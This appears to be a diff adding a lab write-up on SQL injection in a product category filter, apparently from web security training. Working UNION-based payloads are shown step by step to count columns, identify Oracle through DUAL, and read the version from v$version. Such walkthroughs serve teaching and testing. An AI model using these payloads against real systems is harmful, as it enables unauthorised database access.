@@ -1,0 +1,28 @@
+SQL Injection in the product category filter
+
+Goal: display the database version string on Oracle
+
+Analysis:
+---------
+ 
+==========Step 1: Determine the number of columns that the vulnerable query is using==========
+' order by 1--      /*The first column is the title*/
+' order by 2--      /*The second column is the text*/
+' order by 3--      !Error!
+-> The number of columns is 2
+
+==========Step 2: Determine the data type of columns==========
+' UNION SELECT 'a', NULL--      !Error!
+' UNION SELECT 'a', 'a'--       !Error!, so it's maybe Oracle
+
+==========Solution==========
+' UNION SELECT 'a', 'a' from DUAL-- -> Oracle database
+-> Both columns are of data type string.
+
+====Find the version of the database====
+' UNION SELECT banner, NULL from v$version--
+-> Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SELECT banner FROM v$version
+
+script.py <url> 
